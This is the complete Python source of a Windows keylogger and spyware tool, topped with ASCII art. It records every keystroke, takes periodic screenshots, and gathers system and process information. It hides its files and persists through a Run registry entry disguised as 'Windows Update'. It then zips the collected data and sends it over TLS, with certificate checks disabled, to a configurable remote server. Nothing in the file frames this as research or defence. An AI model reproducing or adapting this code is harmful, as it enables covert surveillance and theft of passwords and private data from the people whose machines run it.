"""⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢠⡆⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⣷⣄⠀⠀⠀⠀⣾⣷⠀⠀⠀⠀⣠⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⠿⠃⠀⠀⠀⠉⠉⠁⠀⠀⠐⠿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣶⣶⣶⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣶⣿⣿⡿⣿⣿⣿⡿⠋⠉⠀⠀⠉⠙⢿⣿⣿⡿⣿⣿⣷⣦⡀⠀⠀⠀
⠀⢀⣼⣿⣿⠟⠁⢠⣿⣿⠏⠀⠀⢠⣤⣤⡀⠀⠀⢻⣿⣿⡀⠙⢿⣿⣿⣦⠀⠀
⣰⣿⣿⡟⠁⠀⠀⢸⣿⣿⠀⠀⠀⢿⣿⣿⡟⠀⠀⠈⣿⣿⡇⠀⠀⠙⣿⣿⣷⡄
⠈⠻⣿⣿⣦⣄⠀⠸⣿⣿⣆⠀⠀⠀⠉⠉⠀⠀⠀⣸⣿⣿⠃⢀⣤⣾⣿⣿⠟⠁
⠀⠀⠈⠻⣿⣿⣿⣶⣿⣿⣿⣦⣄⠀⠀⠀⢀⣠⣾⣿⣿⣿⣾⣿⣿⡿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣷⡦⠀⠀⠀⢀⣀⣀⠀⠀⠀⢴⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠟⠁⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠙⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
"""
from pynput import keyboard
from PIL import ImageGrab
import os, datetime, time, threading, subprocess, ctypes, winreg, zipfile, uuid, zipfile, socket, ssl

DATAPATH = "c:\\temp\\dados\\"
TEMPPATH = "c:\\temp\\"
KEYFILE = "keystrokes.txt"
SCRIPTPATH = os.path.abspath(__file__)
HOST = ''
PORT = ''
SECRET = ''
SHOTINTERVAL = 10
PROCINFOINTERVAL = 30
COMPRESSINTERVAL = 30
TRANSFERINTERVAL = 60
keys = []
keyFlag = 0
semaphore = threading.Semaphore(0)

def hide_script():
    ctypes.windll.kernel32.SetFileAttributesW(SCRIPTPATH, 2)

def verify_path ():
    global keyFlag
    keyPath = (DATAPATH + KEYFILE )
    if not os.path.isdir(DATAPATH):
        os.makedirs(DATAPATH)
    ctypes.windll.kernel32.SetFileAttributesW(DATAPATH.strip("dados\\"), 2)
    ctypes.windll.kernel32.SetFileAttributesW(DATAPATH, 2)
    if not os.path.exists(keyPath):
        with open(keyPath, "w") as file:
            file.close()
    ctypes.windll.kernel32.SetFileAttributesW(keyPath, 2)
    keyFlag = 1

def write_file(key):
    with open(DATAPATH + KEYFILE, "a") as file:
        key = str(key)
        file.write(key)
        file.close()

def key_press(key):
    global keys, keyFlag
    try:
        if len(str(key)) <= 5:
            x = str(key)
            if x.startswith("[") and x.endswith("]"):
                x = str(x).replace("[", "")
                x = str(x).replace("]", "")
            if x.startswith("'") and x.endswith("'"):
                x = x.replace("'", "")
            if x.startswith('"') and x.endswith('"') and len(x) != 1:
                x = x.replace('"', "")
            keys.append(x)
        elif str(key) == "Key.backspace":
            keys.pop()
        elif str(key) == "Key.space" or str(key) == "Key.enter" :
            k = ''.join(keys)
            date = datetime.datetime.now().strftime("%m-%d %H:%M:%S")
            write_file("%s\t %s\n" %(date, k))
            keys = []
            if keyFlag == 0:
                ctypes.windll.kernel32.SetFileAttributesW("c:\\temp\\dados\\keystrokes.txt", 2)
                keyFlag = 1
    except:
        pass

def screenshot():
    while True:
        fileName = (datetime.datetime.now().strftime("%m-%d %H.%M.%S")+".png")
        absPath = (DATAPATH + fileName)
        shot = ImageGrab.grab(all_screens=True)
        shot.save(absPath, 'PNG')
        ctypes.windll.kernel32.SetFileAttributesW(absPath, 2)
        time.sleep(SHOTINTERVAL)

def system_info():
    absPath = (DATAPATH + "sysinfo.txt")
    ctypes.windll.kernel32.SetFileAttributesW(absPath, 128)
    with open(absPath, 'w') as file:
        result = subprocess.run(['systeminfo'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        file.write(result.stdout)
    ctypes.windll.kernel32.SetFileAttributesW(absPath, 2)

def processes_info():
    while True:
        absPath = (DATAPATH + "procinfo.txt")
        runningProcesses = []
        result = subprocess.run(['tasklist', '/fo', 'csv'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in result.stdout.splitlines()[1:]:
            processName = line.split(',')[0].strip('"')
            runningProcesses.append(processName)
        runningProcesses = sorted(list(set(runningProcesses)), key=str.lower)
        ctypes.windll.kernel32.SetFileAttributesW(absPath, 128)
        with open(absPath, 'w') as file:
            for processes in runningProcesses:
                file.write(processes+"\n")
        ctypes.windll.kernel32.SetFileAttributesW(absPath, 2)
        time.sleep(PROCINFOINTERVAL)

def add_run_reg():
    keyPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    regHive = winreg.HKEY_CURRENT_USER
    try:
        key = winreg.CreateKey(regHive, keyPath)
        winreg.SetValueEx(key, "Windows Update", 0, winreg.REG_SZ, SCRIPTPATH)
        winreg.CloseKey(key)
    except:
        pass

def rename():
    global keyFlag
    vars = {"oldProc"   : (DATAPATH + "procinfo.txt"),
            "newProc"   : (DATAPATH + "procinfo_%s.txt" %(str(uuid.uuid4()).replace('-', '')[:6])),
            "oldKey"    : (DATAPATH + "keystrokes.txt"),
            "newKey"    : (DATAPATH + "keystrokes_%s.txt" %(str(uuid.uuid4()).replace('-', '')[:6]))
            }
    try:
        if os.path.exists(vars["oldProc"]):
            os.rename(vars["oldProc"], vars["newProc"])
        if os.path.exists(vars["oldKey"]):
            os.rename(vars["oldKey"], vars["newKey"])
            keyFlag = 0
        dirList = os.listdir(DATAPATH)
        if "procinfo.txt" in dirList:
            dirList.remove("procinfo.txt")
        if "keystrokes.txt" in dirList:
            dirList.remove("keystrokes.txt")
        return(dirList)
    except:
        pass

def compress():
    while True:
        zipName = datetime.datetime.now().strftime("%m-%d_%Hh%Mm%Ss.zip")
        zipPath = (TEMPPATH + zipName)
        dirList = rename()
        try:
            with zipfile.ZipFile(zipPath, "w", zipfile.ZIP_DEFLATED) as zip:
                    for file in dirList:
                        filePath = os.path.join(DATAPATH, file)
                        zip.write(filePath, file)
                        os.remove(filePath)
            semaphore.release()
            time.sleep(COMPRESSINTERVAL)
        except:
            pass

def send_file(sslSocket, filePath):
    fileName = os.path.basename(filePath)
    sslSocket.sendall(fileName.encode())
    try:
        with open(filePath, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                sslSocket.sendall(data)
        return True
    except:
        pass

def create_tls_socket(filePath):
    sslContext = ssl.create_default_context()
    sslContext.check_hostname = False
    sslContext.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((HOST, PORT)) as netSocket:
            with sslContext.wrap_socket(netSocket, server_hostname=HOST) as sslSocket:
                binarySecret = SECRET.encode()
                sslSocket.sendall(binarySecret)
                sslSocket.recv(1024)
                if send_file(sslSocket, filePath):
                    return True
    except:
        pass

def data_tranfer():
    semaphore.acquire()
    while True:
        files = []
        if os.path.exists(TEMPPATH):
            for filePath in os.listdir(TEMPPATH):
                if os.path.isfile(os.path.join(TEMPPATH, filePath)):
                    files.append(filePath)
            if files:
                for file in files:
                    filePath = (TEMPPATH + file)
                    if create_tls_socket(filePath):
                        os.remove(filePath)
                        time.sleep(2)
        time.sleep(TRANSFERINTERVAL)

def start_transfer_thread():
    thread = threading.Thread(target=data_tranfer)
    thread.daemon = True
    thread.start()

def start_compress_thread():
    thread = threading.Thread(target=compress)
    thread.daemon = True
    thread.start()

def start_processes_thread():
    thread = threading.Thread(target=processes_info)
    thread.daemon = True
    thread.start()

def start_screenshot_thread():
    thread = threading.Thread(target=screenshot)
    thread.daemon = True
    thread.start()

def start_keyboard_listener():
    listener = keyboard.Listener(on_press=key_press, on_release=on_release)
    listener.start() 
    listener.join()

def on_release(key):
    if str(key) == "Key.esc":
        return False

def main():
    add_run_reg()
    hide_script()
    verify_path()
    start_compress_thread()
    start_screenshot_thread()
    start_processes_thread()
    start_transfer_thread()
    system_info()
    start_keyboard_listener()

if __name__ == '__main__':
   main()